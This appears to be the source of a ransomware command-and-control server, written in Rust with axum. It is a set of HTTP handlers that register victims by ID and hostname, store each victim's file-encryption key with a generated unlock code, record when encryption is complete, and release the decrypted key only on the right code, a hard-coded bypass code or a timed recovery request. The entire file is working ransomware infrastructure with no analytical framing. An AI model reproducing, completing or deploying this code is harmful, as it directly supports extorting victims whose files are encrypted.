use axum::{extract::State, http::StatusCode};
use log::{debug, error, info, warn};
use purecrypto::ct::{Choice, ConstantTimeEq};

use crate::{
    AppState, config,
    crypto::{decrypt_key, generate_code},
    extract::Validated,
    models::Victim,
    time::{get_epoch_time, is_recovery_valid},
};
use coconut_crab_lib::web::{
    codes::RECOVERY_REQUEST_CODE,
    structs::{AnnounceCompletion, DownloadSymKey, Registration, UploadSymKey},
};

pub async fn register(
    State(state): State<AppState>,
    Validated(registration): Validated<Registration>,
) -> Result<&'static str, (StatusCode, &'static str)> {
    let mut db = state.db.clone();

    info!("[{}] Adding New Victim", registration.id);
    let inserted = Victim::upsert_by_id(registration.id.clone())
        .on_create(|victim| {
            victim
                .hostname(registration.hostname.clone())
                .key(None::<String>)
                .code(None::<String>)
                .upload_time(None::<i64>)
                .complete(false)
        })
        .or_ignore()
        .exec(&mut db)
        .await;
    match inserted {
        Ok(Some(_)) => {
            debug!("Inserted new victim into database");
            Ok("Success")
        }
        Ok(None) => {
            warn!(
                "[{}] Existing Victim Found (duplicate key)",
                registration.id
            );
            Err((StatusCode::CONFLICT, "Victim already exists"))
        }
        Err(error) => {
            error!("[{}] Failed to insert victim: {error}", registration.id);
            Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"))
        }
    }
}

fn db_lookup_error(id: &str, action: &str, error: &toasty::Error) -> (StatusCode, &'static str) {
    if error.is_record_not_found() {
        warn!("[{id}] Existing Victim Not Found, cannot {action}");
        (StatusCode::NOT_FOUND, "Victim does not exist")
    } else {
        error!("[{id}] Database error during {action}: {error}");
        (StatusCode::INTERNAL_SERVER_ERROR, "Database error")
    }
}

pub async fn upload_sym_key(
    State(state): State<AppState>,
    Validated(upload_sym_key): Validated<UploadSymKey>,
) -> Result<&'static str, (StatusCode, &'static str)> {
    let mut db = state.db.clone();

    let mut victim = match Victim::get_by_id(&mut db, &upload_sym_key.id).await {
        Ok(victim) => victim,
        Err(error) => {
            return Err(db_lookup_error(
                &upload_sym_key.id,
                "upload symmetric key",
                &error,
            ));
        }
    };

    let code = generate_code();
    let Some(upload_time) = get_epoch_time() else {
        error!("[{}] Cannot determine current time", upload_sym_key.id);
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
    };

    if let Err(err) = toasty::update!(victim {
        key: Some(upload_sym_key.key.clone()),
        code: Some(code.clone()),
        upload_time: Some(upload_time),
    })
    .exec(&mut db)
    .await
    {
        error!("[{}] Failed to update victim: {err}", upload_sym_key.id);
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
    }

    info!("[{}] Added Symmetric Key", upload_sym_key.id);
    info!("[{}] Added Upload Time: {}", upload_sym_key.id, upload_time);

    Ok("Success")
}

pub async fn announce_completion(
    State(state): State<AppState>,
    Validated(announce_completion): Validated<AnnounceCompletion>,
) -> Result<&'static str, (StatusCode, &'static str)> {
    let mut db = state.db.clone();

    let mut victim = match Victim::get_by_id(&mut db, &announce_completion.id).await {
        Ok(victim) => victim,
        Err(error) => {
            return Err(db_lookup_error(
                &announce_completion.id,
                "announce completion",
                &error,
            ));
        }
    };

    info!("[{}] Designating As Complete", announce_completion.id);
    if let Err(err) = toasty::update!(victim { complete: true })
        .exec(&mut db)
        .await
    {
        error!(
            "[{}] Failed to update victim completion: {err}",
            announce_completion.id
        );
        return Err((StatusCode::INTERNAL_SERVER_ERROR, "Database error"));
    }

    Ok("Success")
}

pub async fn download_sym_key(
    State(state): State<AppState>,
    Validated(download_sym_key): Validated<DownloadSymKey>,
) -> Result<String, (StatusCode, &'static str)> {
    let mut db = state.db.clone();

    let existing_victim = match Victim::get_by_id(&mut db, &download_sym_key.id).await {
        Ok(victim) => victim,
        Err(error) => {
            return Err(db_lookup_error(
                &download_sym_key.id,
                "download symmetric key",
                &error,
            ));
        }
    };

    let recovery_valid =
        if !existing_victim.complete && download_sym_key.code == RECOVERY_REQUEST_CODE {
            info!("[{}] Key Recovery Requested", download_sym_key.id);
            let valid = is_recovery_valid(existing_victim.upload_time, existing_victim.complete);
            if valid {
                info!("[{}] Key Recovery Valid", download_sym_key.id);
            } else {
                warn!("[{}] Key Recovery Not Valid", download_sym_key.id);
            }
            valid
        } else {
            false
        };

    let stored_code = existing_victim.code.as_deref().unwrap_or("");
    let authorized = stored_code
        .as_bytes()
        .ct_eq(download_sym_key.code.as_bytes())
        | config::BYPASS_CODE
            .as_bytes()
            .ct_eq(download_sym_key.code.as_bytes())
        | Choice::from(u8::from(recovery_valid));
    if bool::from(authorized) {
        info!("[{}] Correct Code provided", download_sym_key.id);
        info!("[{}] Providing Decrypted Key", download_sym_key.id);
        let Some(stored_key) = existing_victim.key.as_deref() else {
            warn!("[{}] Victim has no uploaded key", download_sym_key.id);
            return Err((StatusCode::NOT_FOUND, "Key not uploaded"));
        };
        return decrypt_key(&state.private_key, stored_key);
    }
    warn!("[{}] Incorrect Code provided", download_sym_key.id);
    Err((StatusCode::FORBIDDEN, "Invalid Code"))
}
